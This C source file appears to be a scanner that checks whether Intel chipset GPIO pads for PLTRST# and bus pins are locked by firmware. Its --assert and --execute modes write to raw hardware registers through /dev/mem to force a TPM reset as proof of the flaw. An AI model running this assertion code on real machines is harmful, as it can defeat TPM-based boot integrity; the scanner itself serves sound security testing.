// SPDX-License-Identifier: GPL-2.0-only
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "platforms/defs.h"

#define ISA		0, 31, 0
#define P2SB		0, 31, 1
#define SBREG_BAR	0x10
#define SBREG_BARH	0x14
#define P2SBC		0xe0
# define P2SBC_HIDE	(1<<8)

extern struct platform platform_skl_kbl_s_h;
extern struct platform platform_skl_kbl_lp;
extern struct platform platform_cfl_s_h;
extern struct platform platform_adl_p;
extern struct platform platform_adl_s;
extern struct platform platform_rpl_s;
extern struct platform platform_rpl_p;
extern struct platform platform_cnp_lp;
extern struct platform platform_cml_u;
extern struct platform platform_cml_dt;
extern struct platform platform_tgl;
extern struct platform platform_arl_s;
extern struct platform platform_mtl;
extern struct platform platform_pre_skl;

static struct platform *platforms[] = {
	&platform_skl_kbl_s_h,
	&platform_skl_kbl_lp,
	&platform_cfl_s_h,
	&platform_adl_p,
	&platform_adl_s,
	&platform_rpl_s,
	&platform_rpl_p,
	&platform_cnp_lp,
	&platform_cml_u,
	&platform_cml_dt,
	&platform_tgl,
	&platform_arl_s,
	&platform_mtl,
	&platform_pre_skl,
	NULL
};

static int devmemfd = -1;
static uint64_t sbreg_base = 0;

__attribute__((destructor)) static void close_devmemfd(void)
{
	if (devmemfd != -1)
		close(devmemfd);
}

#define PCI_READ(width) \
static uint## width ##_t pci_read ## width(uint8_t bus, uint8_t dev, uint8_t fn, uint16_t offset) \
{ \
	typeof(pci_read ## width(0, 0, 0, 0)) ret; \
	if (pread(devmemfd, &ret, sizeof ret, 0xe0000000 | bus << 20 | dev << 15 | fn << 12 | offset) != sizeof ret) { \
		perror("/dev/mem"); \
		ret = -1; \
	} \
	return ret; \
}

#define PCI_WRITE(width) \
static void pci_write ## width(uint8_t bus, uint8_t dev, uint8_t fn, uint16_t offset, uint## width ##_t val) \
{ \
	if (pwrite(devmemfd, &val, sizeof val, 0xe0000000 | bus << 20 | dev << 15 | fn << 12 | offset) != sizeof val) \
		perror("/dev/mem"); \
}

PCI_READ(16)
PCI_WRITE(16)
PCI_READ(32)
PCI_WRITE(32)

static uint32_t pcr_read32(uint8_t port, uint16_t offset)
{
	uint32_t ret;
	if (pread(devmemfd, &ret, sizeof ret, sbreg_base + (port << 16) + offset) != sizeof ret) {
		perror("/dev/mem");
		ret = -1;
	}
	return ret;
}

static void pcr_write32(uint8_t port, uint16_t offset, uint32_t val)
{
	if (pwrite(devmemfd, &val, sizeof val, sbreg_base + (port << 16) + offset) != sizeof val)
		perror("/dev/mem");
}

static inline int bitpos(uint32_t mask)
{
	return __builtin_ctz(mask);
}

static int init_sbreg(void)
{
	printf("Unhiding P2SB bridge...\n");
	pci_write32(P2SB, P2SBC, 0);
	if (pci_read32(P2SB, 0) == 0xffffffff) {
		fprintf(stderr, "Failed to unhide P2SB bridge\n");
		return -1;
	}
	sbreg_base = ((uint64_t)pci_read32(P2SB, SBREG_BARH) << 32) |
	             (pci_read32(P2SB, SBREG_BAR) & 0xff000000);
	printf("Private configuration space at %016" PRIx64 "\n", sbreg_base);
	return 0;
}

static void print_classification(struct platform *platform)
{
	printf("\n=== VULNERABILITY CLASSIFICATION ===\n");
	if (platform->tier <= -1) {
		printf("NOT VULNERABLE -- %s\n", platform->summary);
		printf("Action: %s\n", platform->action);
	} else if (platform->tier == 1) {
		printf("TIER 1 -- %s\n", platform->summary);
		printf("Action: %s\n", platform->action);
	} else if (platform->tier == 2) {
		printf("TIER 2 -- %s\n", platform->summary);
		printf("Action: %s\n", platform->action);
	} else if (platform->tier == 3) {
		printf("TIER 3 -- %s\n", platform->summary);
		printf("Action: %s\n", platform->action);
	} else {
		printf("Platform classification unknown.\n");
	}
}

static void print_summary(struct platform *platform, int detection_result, int asserted)
{
	printf("\n============================== SUMMARY ==============================\n");
	printf("Platform: %s\n", platform->name);
	printf("Vulnerability tier: ");
	if (platform->tier <= -1)
		printf("NOT VULNERABLE\n");
	else if (platform->tier == 1)
		printf("TIER 1 -- confirmed vulnerable\n");
	else if (platform->tier == 2)
		printf("TIER 2 -- vulnerable (unconfirmed)\n");
	else if (platform->tier == 3)
		printf("TIER 3 -- vulnerability uncertain\n");
	else
		printf("UNKNOWN\n");

	if (platform->global_pins) {
		int pad_index = bitpos(platform->global_pins->lock_bit);
		uint32_t dw0_offs = platform->pad_cfg_base + (pad_index * 16);
		printf("PLTRST# pad: %s/%s at port 0x%x, offset 0x%x\n",
		       platform->global_pins->gpio, platform->global_pins->nf,
		       platform->global_pins->port, dw0_offs);
	}

	printf("Summary: %s\n", platform->summary ? platform->summary : "N/A");
	if (detection_result == 0) {
		printf("All detected pins are locked by firmware.\n");
	} else if (detection_result > 0) {
		printf("WARNING: %d pin(s) are UNLOCKED.\n", detection_result);
	}
	if (asserted)
		printf("PLTRST# assertion was performed.\n");
	printf("================================================================\n");
}

static void print_register_layout(struct platform *platform, struct pin *pin)
{
	int pad_index = bitpos(pin->lock_bit);
	uint32_t dw0_offs = platform->pad_cfg_base + (pad_index * 16);
	uint32_t lock_base = pin->lock_offset;

	printf("\n  Register layout for pad %s (pad index %d):\n", pin->gpio, pad_index);
	printf("    PAD_CFG_BASE:           0x%x\n", platform->pad_cfg_base);
	printf("    DW0 (PAD_CFG0):         0x%x  (base + pad_idx * 16)\n", dw0_offs);
	printf("    DW1 (PAD_CFG1):         0x%x  (DW0 + 4)\n", dw0_offs + 4);
	printf("    DW2 (PAD_CFG2):         0x%x  (DW0 + 8)\n", dw0_offs + 8);
	printf("    DW3 (PAD_CFG3):         0x%x  (DW0 + 12)\n", dw0_offs + 12);
	printf("    PADCFGLOCK base:        0x%x\n", lock_base);
	printf("    PADCFGLOCKTX base:      0x%x  (PADCFGLOCK + 4)\n", lock_base + 4);
	printf("  DW0 bit fields:\n");
	printf("    [0]    TX state (1=high, 0=low)\n");
	printf("    [1]    RX state (read-only)\n");
	printf("    [8]    TX disable\n");
	printf("    [9]    RX disable\n");
	printf("    [13:10] Mode (0000=GPIO, 0001=NF1, ...)\n");
	printf("    [31:30] Reset config (10=PLTRST)\n");
}

static int perform_assertion(struct platform *platform, struct pin *pin)
{
	int pad_index = bitpos(pin->lock_bit);
	uint32_t dw0_offs = platform->pad_cfg_base + (pad_index * 16);
	uint32_t dw1_offs = dw0_offs + 4;

	print_register_layout(platform, pin);

	// Check PADCFGLOCK and PADCFGLOCKTX before asserting
	printf("\n  Checking lock registers...\n");
	uint32_t lock_val = pcr_read32(pin->port, pin->lock_offset);
	uint32_t locktx_val = pcr_read32(pin->port, pin->lock_offset + 4);
	uint32_t lock_bit_val = pin->lock_bit;
	int locked = !!(lock_val & lock_bit_val);
	int tx_locked = !!(locktx_val & lock_bit_val);

	printf("    PADCFGLOCK   at 0x%x = 0x%08x (bit %d: %s)\n",
	       pin->lock_offset, lock_val, pad_index,
	       locked ? "LOCKED" : "UNLOCKED");
	printf("    PADCFGLOCKTX at 0x%x = 0x%08x (bit %d: %s)\n",
	       pin->lock_offset + 4, locktx_val, pad_index,
	       tx_locked ? "LOCKED" : "UNLOCKED");

	if (locked)
		printf("    WARNING: PLTRST pad is LOCKED -- writes may be silently ignored!\n");

	// Read and display original pad configuration
	uint32_t orig_dw0 = pcr_read32(pin->port, dw0_offs);
	uint32_t orig_dw1 = pcr_read32(pin->port, dw1_offs);
	printf("\n  Original pad config:\n");
	printf("    DW0 = 0x%08x  DW1 = 0x%08x\n", orig_dw0, orig_dw1);

	uint32_t orig_mode = (orig_dw0 >> 10) & 0x7;
	uint32_t orig_tx   = orig_dw0 & 1;
	uint32_t orig_txdis = (orig_dw0 >> 8) & 1;
	uint32_t orig_rstcfg = (orig_dw0 >> 30) & 3;
	const char *mode_str = orig_mode == 0 ? "GPIO" :
	                       orig_mode == 1 ? "NF1" :
	                       orig_mode == 2 ? "NF2" : "NF3+";
	const char *rst_str = orig_rstcfg == 2 ? "PLTRST" :
	                      orig_rstcfg == 0 ? "PWROK" :
	                      orig_rstcfg == 1 ? "DEEP" : "RSMRST";
	printf("    Decoded: mode=%s TX=%s TX_DIS=%s RSTCFG=%s\n",
	       mode_str, orig_tx ? "high" : "low",
	       orig_txdis ? "disabled" : "enabled", rst_str);

	// Assert PLTRST#
	printf("\n  Asserting PLTRST# (writing DW0 <- 0x80000000)...\n");
	pcr_write32(pin->port, dw0_offs, 0x80000000);
	uint32_t assert_rb = pcr_read32(pin->port, dw0_offs);
	printf("    Readback: 0x%08x\n", assert_rb);
	if (assert_rb != 0x80000000)
		printf("    NOTE: Readback differs -- register may be locked or write-ignored\n");

	sleep(1);

	// DW1 manipulation test (write 0x00000000 and 0xFFFFFFFF, check readback)
	printf("\n  DW1 manipulation test:\n");
	uint32_t dw1_orig = pcr_read32(pin->port, dw1_offs);
	printf("    DW1 original: 0x%08x\n", dw1_orig);
	for (int test_val = 0; test_val <= 1; test_val++) {
		uint32_t val = test_val ? 0xFFFFFFFF : 0x00000000;
		pcr_write32(pin->port, dw1_offs, val);
		uint32_t dw1_rb = pcr_read32(pin->port, dw1_offs);
		int match = (dw1_rb == val);
		printf("    DW1 write 0x%08x -> readback 0x%08x (%s)\n",
		       val, dw1_rb, match ? "match" : "MISMATCH");
	}
	// Restore DW1
	pcr_write32(pin->port, dw1_offs, dw1_orig);
	printf("    DW1 restored to 0x%08x\n", dw1_orig);

	// Release PLTRST#
	printf("\n  Releasing PLTRST# (restoring original DW0)...\n");
	pcr_write32(pin->port, dw0_offs, orig_dw0);
	uint32_t release_rb = pcr_read32(pin->port, dw0_offs);
	printf("    Readback: 0x%08x\n", release_rb);

	return 0;
}

static int check_tpm_pcrs(void)
{
	if (access("/sys/class/tpm/tpm0/pcrs", F_OK) == 0) {
		printf("TPM PCRs found - TPM reset successful\n");
		return 0;
	}
	printf("TPM PCRs not found - TPM did not reset\n");
	return 1;
}

static int detect_pinset(struct pin *pins)
{
	int status = 0;
	printf("  %-10s %-12s %-10s %-10s\n", "GPIO", "Signal", "CFG Lock", "TX Lock");
	printf("  %-10s %-12s %-10s %-10s\n", "----", "------", "--------", "-------");
	for (struct pin *pin = pins; pin->gpio; ++pin) {
		uint32_t lock_val = pcr_read32(pin->port, pin->lock_offset);
		uint32_t locktx_val = pcr_read32(pin->port, pin->lock_offset + 4);
		int cfg_locked = !!(lock_val & pin->lock_bit);
		int tx_locked = !!(locktx_val & pin->lock_bit);
		status |= !(cfg_locked && tx_locked);
		printf("  %-10s %-12s %-10s %-10s",
		       pin->gpio, pin->nf,
		       cfg_locked ? "LOCKED" : "UNLOCKED",
		       tx_locked ? "LOCKED" : "UNLOCKED");
		if (!cfg_locked && !tx_locked)
			printf("  <- UNLOCKED");
		else if (!cfg_locked)
			printf("  <- CFG unlocked");
		else if (!tx_locked)
			printf("  <- TX unlocked");
		printf("\n");
	}
	return status;
}

static int count_unlocked(struct pin *pins)
{
	int unlocked = 0;
	for (struct pin *pin = pins; pin->gpio; ++pin) {
		uint32_t lock_val = pcr_read32(pin->port, pin->lock_offset);
		uint32_t locktx_val = pcr_read32(pin->port, pin->lock_offset + 4);
		if (!(lock_val & pin->lock_bit) || !(locktx_val & pin->lock_bit))
			unlocked++;
	}
	return unlocked;
}

static int scan_platform(struct platform *platform)
{
	printf("Unhiding P2SB bridge...\n");
	pci_write32(P2SB, P2SBC, 0);
	if (pci_read32(P2SB, 0) == 0xffffffff) {
		fprintf(stderr, "Failed to unhide P2SB bridge, bailing!\n");
		return -1;
	}
	sbreg_base = ((uint64_t) pci_read32(P2SB, SBREG_BARH) << 32) |
	             (pci_read32(P2SB, SBREG_BAR) & 0xff000000);
	printf("Private configuration space is accesible at %016" PRIx64 "\n", sbreg_base);
	printf("Hiding P2SB bridge...\n");
	pci_write32(P2SB, P2SBC, P2SBC_HIDE);

	int unlocked_count = 0;
	if (platform->global_pins) {
		printf("\n--- PLTRST# Pad Lock Status ---\n");
		detect_pinset(platform->global_pins);
		unlocked_count += count_unlocked(platform->global_pins);
	} else {
		printf("No PLTRST# pad definition for this platform (not affected)\n");
	}

	int is_espi = 1;
	if (platform->lpc_pins)
		is_espi = !!(pcr_read32(platform->espi_check_port, platform->espi_check_offset) & platform->espi_check_bit);

	if (platform->espi_pins || platform->lpc_pins) {
		printf("\n--- Bus Pin Lock Status ---\n");
		if (is_espi) {
			printf("Platform in eSPI mode (PCR 0x%x:0x%x bit %d set)\n",
			       platform->espi_check_port, platform->espi_check_offset,
			       bitpos(platform->espi_check_bit));
			detect_pinset(platform->espi_pins);
			unlocked_count += count_unlocked(platform->espi_pins);
		} else {
			printf("Platform in LPC mode (PCR 0x%x:0x%x bit %d clear)\n",
			       platform->espi_check_port, platform->espi_check_offset,
			       bitpos(platform->espi_check_bit));
			detect_pinset(platform->lpc_pins);
			unlocked_count += count_unlocked(platform->lpc_pins);
		}
	} else {
		printf("No bus pins defined for this platform\n");
	}

	return unlocked_count;
}

int main(int argc, char *argv[])
{
	int do_assert = 0, do_execute = 0;

	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--assert") == 0)
			do_assert = 1;
		else if (strcmp(argv[i], "--execute") == 0 ||
		         strcmp(argv[i], "--full") == 0)
			do_execute = 1;
		else {
			fprintf(stderr, "Usage: %s [--assert] [--execute|--full]\n", argv[0]);
			return 1;
		}
	}

	devmemfd = open("/dev/mem", O_RDWR);

	if (devmemfd < 0) {
		perror("/dev/mem");
		return 1;
	}


	uint16_t isa_vendor = pci_read16(ISA, 0);
	if (isa_vendor != 0x8086) {
		fprintf(stderr, "Unknown ISA bridge vendor %04x, expected 8086 for Intel\n", isa_vendor);
		return 1;
	}
	uint16_t isa_device = pci_read16(ISA, 2);
	struct platform *platform = NULL;
	for (struct platform **pp = platforms; *pp; ++pp) {
		for (struct pch *pch = (*pp)->pchs; pch->name; ++pch) {
			if (pch->pid == isa_device) {
				printf("Found platform %s with PCH %s!\n", (*pp)->name, pch->name);
				platform = *pp;
				break;
			}
		}
	}

	if (!platform) {
		fprintf(stderr, "Unknown ISA bridge device %04x\n", isa_device);
		return 1;
	}

	if (do_assert) {
		printf("=== PLTRST# Assertion Mode ===\n");
		if (!platform->global_pins) {
			printf("No PLTRST# pad definition for this platform (not affected)\n");
			return 0;
		}
		if (init_sbreg() < 0)
			return 127;
		pci_write32(P2SB, P2SBC, P2SBC_HIDE);
		perform_assertion(platform, platform->global_pins);
		return check_tpm_pcrs();
	}

	int err = scan_platform(platform);
	if (err < 0)
		return 127; // detection error

	// 3-tier vulnerability classification
	print_classification(platform);

	int asserted = 0;
	if (do_execute) {
		if (err > 0 && platform->global_pins) {
			printf("\n=== Unlocked pins detected - attempting PLTRST# assertion ===\n");
			perform_assertion(platform, platform->global_pins);
			err = check_tpm_pcrs();
			asserted = 1;
		} else if (err == 0) {
			printf("\nAll pins locked. System not vulnerable, no assertion needed.\n");
		} else {
			printf("\nNo PLTRST# pad defined for this platform.\n");
		}
	}

	// Summary output
	print_summary(platform, err, asserted);

	return err;
}
